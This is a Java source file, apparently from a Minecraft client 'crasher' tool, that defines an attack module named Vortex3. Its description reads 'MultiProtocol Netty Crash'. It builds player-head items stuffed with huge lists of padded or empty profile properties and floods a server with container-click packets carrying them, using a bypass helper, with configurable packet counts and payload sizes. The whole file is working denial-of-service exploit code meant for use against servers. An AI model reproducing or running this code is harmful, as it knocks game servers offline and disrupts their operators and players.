package us.whitedev.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.helpers.BypassHelper;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.protocol.XynisProtocol;
import us.whitedev.protocol.components.data.DataComponents;
import us.whitedev.protocol.components.data.impl.DataProfile;
import us.whitedev.protocol.packets.PacketCodec;
import us.whitedev.protocol.packets.play.PacketContainerClick;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.*;
import java.util.concurrent.ThreadLocalRandom;
import java.util.stream.IntStream;

public class Vortex3 implements Crasher {
    private static final String METHOD_NAME = "Vortex3";
    private boolean enabled = false;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        int length = Integer.parseInt(args[4]);
        String type = args[5].toLowerCase(Locale.ROOT);
        setEnabled(true);

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.isVisible ? getName() : "******"), true);

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        if (XynisProtocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
            us.whitedev.protocol.components.objects.ItemStack itemStack = getDataSkullStack(size, length, type);
            PacketCodec.sendPacket(new PacketContainerClick(protocol, 0, 1, 10,
                    PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.RIGHT_CLICK,
                    itemStack, new Int2ObjectArrayMap<>()), packets);
        }else{
            ItemStack itemStack = getSkullStack(size, length, type);
            for (int i = 0; i < packets; i++)
                PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.PICKUP_ALL, itemStack, new Int2ObjectOpenHashMap<>()));

        }

        setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    private ItemStack getSkullStack(int size, int length, String propType) {
        CompoundTag skullTag = new CompoundTag();
        CompoundTag skullOwner = new CompoundTag();

        CompoundTag properties = getSkullCompound(size, length, propType);

        skullOwner.put("Properties", properties);
        skullOwner.putString("Name", String.valueOf(ThreadLocalRandom.current().nextInt()));
        skullOwner.putString("Id", UUID.randomUUID().toString());
        skullTag.put("SkullOwner", skullOwner);

        return new ItemStack(Items.PLAYER_HEAD, 1, Optional.of(skullTag));
    }

    private CompoundTag getSkullCompound(int size, int length, String propType) {
        CompoundTag properties = new CompoundTag();
        switch (propType) {
            case "full" -> {
                CompoundTag compound;
                String boostString = bypassHelper.generateString(length, BypassHelper.StringType.BOOST2);
                ListTag propertyList = new ListTag();
                for (int a = 0; a < size; a++) {
                    compound = new CompoundTag();
                    compound.putString("Value", boostString);
                    compound.putString("Signature", boostString);
                    propertyList.add(compound);
                }
                properties.put("0", propertyList);
            }
            case "empty" -> {
                ListTag propertyList = new ListTag();
                IntStream.range(0, size).forEach(i -> propertyList.add(new CompoundTag()));
                properties.put("", propertyList);
            }
        }
        return properties;
    }

    private us.whitedev.protocol.components.objects.ItemStack getDataSkullStack(int size, int length, String propType){
        List<DataProfile.Property> properties = new ArrayList<>();
        switch (propType) {
            case "full" -> {
                String boostString = bypassHelper.generateString(length, BypassHelper.StringType.BOOST2);
                for (int a = 0; a < size; a++) {
                    properties.add(new DataProfile.Property(
                            "",
                            boostString,
                            boostString
                    ));
                }
            }
            case "empty" -> IntStream.range(0, size).forEach(i ->
                    properties.add(new DataProfile.Property("", "", "")));
        }

        DataProfile profile = new DataProfile(
                String.valueOf(ThreadLocalRandom.current().nextInt()),
                UUID.randomUUID(),
                properties
        );

        DataComponents components = new DataComponents();
        components.put(profile);

        return new us.whitedev.protocol.components.objects.ItemStack(1, 1, components);
    }

    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Size", OptionType.INTEGER),
                new OptionUtil("Length", OptionType.INTEGER),
                new OptionUtil("Type", OptionType.LIST, new String[]{"Empty", "Full"})
        );
    }

    @Override
    public String getArgsUsage() {
        return "packets[100], size[2767], length[10], type[empty]";
    }


    @Override
    public String getDescription() {
        return "MultiProtocol Netty Crash";
    }
}
